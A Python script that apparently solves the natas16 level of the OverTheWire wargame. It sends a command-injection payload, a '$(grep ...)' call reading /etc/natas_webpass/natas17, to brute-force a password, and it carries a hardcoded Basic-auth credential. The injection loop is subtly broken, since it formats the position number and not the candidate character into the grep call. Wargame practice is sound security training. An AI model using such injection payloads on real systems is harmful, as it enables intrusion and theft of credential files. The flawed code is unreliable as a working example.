import requests

headers = {'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}

url = 'http://natas16.natas.labs.overthewire.org/index.php'

password = ''

#from natas 15 we will assume that the password is 32 characters long

length = 32

print('the password is {} characters long'.format(length))

#now that we have the length, we need to find each character of the password

for c in range(1,length+1): #loop for each character in the password
    for i in range(33,127): #loop for each possible ascii character (33-126 are non-whitespace pw allowable chrs)
        payload = '?needle=%24%28grep+{}+..%2F..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(c, i)
        
        r = requests.post(url+payload, headers=headers)
        if 'exists' in r.text:
            password += chr(i)
            break

print(password)
